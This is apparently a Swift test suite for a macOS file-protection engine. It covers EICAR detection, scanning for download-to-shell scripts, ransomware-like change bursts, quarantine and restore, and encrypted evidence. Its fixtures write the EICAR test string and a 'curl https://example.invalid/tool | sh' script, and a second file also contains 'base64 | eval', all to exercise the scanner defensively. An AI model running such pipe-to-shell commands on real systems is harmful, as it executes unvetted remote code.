import CryptoKit
import Foundation

@main
struct ProtectionEngineTests {
    static func main() async throws {
        func expect(_ condition: @autoclosure () -> Bool, _ message: String) {
            if !condition() {
                fputs("FAIL: \(message)\n", stderr)
                exit(1)
            }
        }

        let root = FileManager.default.temporaryDirectory.appendingPathComponent("OracleProtectionQA-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let snapshot = root.appendingPathComponent("snapshot.json")
        let benign = root.appendingPathComponent("benign.txt")
        try Data("ordinary text".utf8).write(to: benign)
        let eicar = root.appendingPathComponent("eicar.txt")
        let eicarText = ["X5O!P%@AP[4\\PZX54(P^)7CC)7}$", "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!", "$H+H*"].joined()
        try Data(eicarText.utf8).write(to: eicar)
        let script = root.appendingPathComponent("download.command")
        try Data("#!/bin/sh\ncurl https://example.invalid/tool | sh\n".utf8).write(to: script)
        try FileManager.default.setAttributes([.posixPermissions: 0o700], ofItemAtPath: script.path)
        let documentation = root.appendingPathComponent("security-guide.md")
        try Data("Example: curl https://example.invalid/tool | sh and base64 | eval\n".utf8).write(to: documentation)

        let first = ProtectionEngine.scanFiles(root: root, snapshotURL: snapshot)
        expect(first.filesInspected >= 3, "bounded scanner inventories regular files")
        expect(first.findings.contains(where: { $0.title.contains("test signature") && $0.severity == .critical }), "EICAR plumbing test is detected")
        expect(first.findings.contains(where: { $0.title.contains("Suspicious executable-script") && $0.severity == .high }), "download-to-shell heuristic is detected")
        expect(!first.findings.contains(where: { $0.resource == documentation.path }), "documentation mentioning a shell command is not treated as executable script")
        expect(first.warnings.contains(where: { $0.contains("First scan") }), "first scan creates a baseline without inventing a burst")
        expect(first.engine.contains("not antivirus-equivalent") == false, "engine label remains factual without unsupported AV branding")

        for index in 0..<55 {
            let url = root.appendingPathComponent("bulk-\(index).txt")
            try Data("baseline-\(index)".utf8).write(to: url)
        }
        _ = ProtectionEngine.scanFiles(root: root, snapshotURL: snapshot)
        for index in 0..<55 {
            let url = root.appendingPathComponent("bulk-\(index).txt")
            try Data("modified-\(index)-with-different-size".utf8).write(to: url)
        }
        let third = ProtectionEngine.scanFiles(root: root, snapshotURL: snapshot)
        expect(third.findings.contains(where: { $0.title.contains("Ransomware-like") && $0.severity == .high }), "metadata snapshot detects a large file-change burst")

        let storage = ProtectionStorage(baseURL: root.appendingPathComponent("state", isDirectory: true))
        storage.ensureDirectories()
        let rootA = root.appendingPathComponent("root-a", isDirectory: true)
        let rootB = root.appendingPathComponent("root-b", isDirectory: true)
        try FileManager.default.createDirectory(at: rootA, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: rootB, withIntermediateDirectories: true)
        try Data("a".utf8).write(to: rootA.appendingPathComponent("a.txt"))
        try Data("b".utf8).write(to: rootB.appendingPathComponent("b.txt"))
        let isolatedA = ProtectionEngine.scanFiles(root: rootA, snapshotURL: storage.scanSnapshotURL(for: rootA))
        let isolatedB = ProtectionEngine.scanFiles(root: rootB, snapshotURL: storage.scanSnapshotURL(for: rootB))
        expect(!isolatedA.findings.contains(where: { $0.title.contains("Ransomware-like") }), "first scan of root A has no cross-root burst")
        expect(!isolatedB.findings.contains(where: { $0.title.contains("Ransomware-like") }), "first scan of root B has no cross-root burst")
        guard let eicarFinding = first.findings.first(where: { $0.title.contains("test signature") }) else { throw NSError(domain: "QA", code: 1) }
        let originalDigest = try ProtectionStorage.sha256File(eicar)
        let record = try storage.quarantine(fileURL: eicar, finding: eicarFinding)
        expect(!FileManager.default.fileExists(atPath: eicar.path), "quarantine removes the file only from its original path")
        expect(FileManager.default.fileExists(atPath: record.payloadPath), "quarantine payload is preserved")
        expect(record.sha256 == originalDigest, "quarantine records the original SHA-256")
        expect(storage.listQuarantine().count == 1, "quarantine metadata persists")
        _ = try storage.restore(record)
        expect(FileManager.default.fileExists(atPath: eicar.path), "quarantine restore returns the file")
        let restoredDigest = try ProtectionStorage.sha256File(eicar)
        expect(restoredDigest == originalDigest, "restored file hash matches")

        let cancelledTask = Task.detached { () -> ProtectionScanReport in
            while !Task.isCancelled { await Task.yield() }
            return ProtectionEngine.scanFiles(root: root, snapshotURL: root.appendingPathComponent("cancelled-snapshot.json"))
        }
        cancelledTask.cancel()
        let cancelledReport = await cancelledTask.value
        expect(cancelledReport.cancelled, "scanner honors an explicit cooperative cancellation request")

        let event = ProtectionEvent(id: UUID(), observedAt: Date(), kind: "test", severity: .info, source: "QA", summary: "event persisted", resource: root.path, evidence: ["no secret"], dedupeKey: "qa.event")
        try storage.append(event)
        expect(storage.loadEvents().first?.dedupeKey == "qa.event", "normalized security event persists")

        let key = SymmetricKey(size: .bits256)
        let sensitive = Data("disposable camera evidence".utf8)
        let encrypted = try CameraEvidenceCipher.encrypt(sensitive, key: key)
        expect(encrypted != sensitive, "camera evidence ciphertext differs from plaintext")
        let decrypted = try CameraEvidenceCipher.decrypt(encrypted, key: key)
        expect(decrypted == sensitive, "camera evidence round-trips through AES-GCM")

        let capabilities = ProtectionEngine.capabilities(auditVerified: true, scanVerified: true, quarantineVerified: true, scheduledVerified: true, scheduledEnabled: false)
        expect(capabilities.contains(where: { $0.id == "endpoint-security" && $0.status == .blocked }), "Endpoint Security is marked blocked")
        expect(capabilities.contains(where: { $0.id == "network-extension" && $0.status == .blocked }), "Network Extension live blocking is marked blocked")
        expect(capabilities.contains(where: { $0.id == "engine" && $0.status == .missing }), "missing maintained malware engine is disclosed")
        expect(capabilities.allSatisfy { $0.limitations.contains("antivirus") || $0.id != "scan" }, "scan capability retains an antivirus-equivalence limitation")
        expect(capabilities.first(where: { $0.id == "scheduled" })?.evidence.contains("currently disabled") == true, "historical schedule verification is separated from current disabled state")
        let enabledCapabilities = ProtectionEngine.capabilities(auditVerified: true, scanVerified: true, quarantineVerified: true, scheduledVerified: true, scheduledEnabled: true)
        expect(enabledCapabilities.first(where: { $0.id == "scheduled" })?.evidence.contains("currently enabled") == true, "enabled schedule state is surfaced explicitly")

        let security = SecurityPromptContext(title: "Test finding", content: "Observed: fixture")
        let messages = OracleObsidianPromptBuilder.messages(userText: "Explain", note: nil, securityContext: security)
        expect(messages.count == 3 && messages.last?["content"]?.contains("UNTRUSTED LOCAL SECURITY FINDING CONTEXT") == true, "security context is a separate untrusted message")
        expect(messages.first?["content"]?.contains("Never claim a response action was executed") == true, "prompt forbids false execution claims")

        print("PASS Oracle protection engine: 27 assertions")
    }
}
